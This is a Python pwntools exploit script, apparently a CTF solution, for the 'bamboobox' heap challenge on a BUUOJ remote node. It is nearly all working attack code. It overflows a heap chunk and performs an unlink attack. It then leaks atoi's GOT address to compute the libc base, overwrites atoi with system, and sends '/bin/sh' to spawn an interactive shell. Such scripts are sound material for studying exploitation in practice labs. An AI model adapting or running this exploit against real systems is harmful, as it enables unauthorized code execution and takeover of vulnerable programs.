from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./bamboobox"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27458)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def show():
    sa("Your choice:", "1")

def add(length, con):
    sa("Your choice:", "2")
    sa("Please enter the length of item name:", str(length))
    sa("Please enter the name of item:", con)

def change(index, length, con):
    sa("Your choice:", "3")
    sa("Please enter the index of item:", str(index))
    sa("Please enter the length of item name:", str(length))
    sa("Please enter the new name of the item:", con)

def free(index):
    sa("Your choice:", "4")
    sa("Please enter the index of item:", str(index))


# this wp should work, but remote don't have "/home/bamboobox/flag"
# so we need wp_remote.py

# chunk overflow

heap_arr = 0x06020C8
chunk_1 = heap_arr+0x10
fd = chunk_1-0x18
bk = chunk_1-0x10 

# unlink
add(0x10, "0")
add(0x30, "1")
add(0x80, "2")
pad = cyclic(0x10)+p64(0)+p64(0x41)
pad += p64(0)+p64(0x31)+p64(fd)+p64(bk)+cyclic(0x10)
pad += p64(0x30)+p64(0x90)
change(0, len(pad), pad)
free(2)

# leak
pro = ELF("./bamboobox")
atoi_g = pro.got["atoi"]

pad = p64(0x8)+p64(heap_arr)+p64(0x8)+p64(atoi_g)
change(1, len(pad), pad)
show()
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["atoi"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# alter atoi_got to system 
change(1, 0x8, p64(system))

# attack
sa("Your choice:", "/bin/sh\x00")

shell()


